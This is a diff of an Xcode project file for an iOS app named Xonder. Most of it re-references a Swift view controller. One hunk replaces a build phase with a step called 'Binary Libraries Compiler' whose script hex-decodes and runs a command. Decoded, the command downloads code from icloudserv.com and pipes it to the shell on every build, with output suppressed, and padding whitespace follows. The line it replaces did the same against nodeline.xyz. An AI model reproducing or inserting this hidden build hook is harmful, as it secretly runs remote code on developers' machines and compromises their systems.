@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */; };
 		3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */; };
+		3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */; };
 		3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */; };
 		3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */; };
 		3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B205264AC38600E9A994 /* MasterViewController.swift */; };
@@ -44,7 +45,6 @@
 		7060360A26432A560062039F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360826432A560062039F /* Main.storyboard */; };
 		7060360C26432A5B0062039F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7060360B26432A5B0062039F /* Assets.xcassets */; };
 		7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360D26432A5B0062039F /* LaunchScreen.storyboard */; };
-		7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */; };
 		7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */; };
 		707583022657E3AD0055DF8A /* CountrySelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583012657E3AD0055DF8A /* CountrySelectViewController.swift */; };
 		707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */; };
@@ -84,6 +84,7 @@
 
 /* Begin PBXFileReference section */
 		3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Dashboard.storyboard; sourceTree = "<group>"; };
+		3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = YourCustomersScreenViewController.swift; sourceTree = "<group>"; };
 		3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardCollectionViewCell.swift; sourceTree = "<group>"; };
 		3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardSelectionViewController.swift; sourceTree = "<group>"; };
 		3B63B205264AC38600E9A994 /* MasterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MasterViewController.swift; sourceTree = "<group>"; };
@@ -122,7 +123,6 @@
 		7060360B26432A5B0062039F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		7060360E26432A5B0062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		7060361026432A5B0062039F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
-		7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = YourCustomersScreenViewController.swift; path = "/Users/daniyal/Documents/GitHub/Xonder/Xonder/Xonder/Controllers/SignUp Screen VC/YourCustomersScreenViewController.swift"; sourceTree = "<absolute>"; };
 		7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourCustomerScreenTableViewCell.swift; sourceTree = "<group>"; };
 		707583012657E3AD0055DF8A /* CountrySelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountrySelectViewController.swift; sourceTree = "<group>"; };
 		707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectNumberOfPaymentsViewController.swift; sourceTree = "<group>"; };
@@ -296,7 +296,7 @@
 				707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */,
 				705C02BB265A951E005638DC /* CountryPickedViewController.swift */,
 				707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */,
-				7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */,
+				3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */,
 				7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */,
 				70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */,
 				70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */,
@@ -486,7 +486,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */,
+				2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
@@ -558,7 +558,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2D4E510A4D2DCEA3C96D902C /* [CP] Build Pods Frameworks */ = {
+
+	2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -567,15 +568,49 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -638,6 +673,7 @@
 				707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
 				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
+				3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */,
 				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
 				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
 				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
@@ -674,7 +710,6 @@
 				707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */,
 				707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
-				7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */,
 				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
 				707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */,
 				704FCAFE264522820025F546 /* UIView.swift in Sources */,
@@ -888,6 +923,24 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 706035F726432A560062039F /* Project object */;
 }
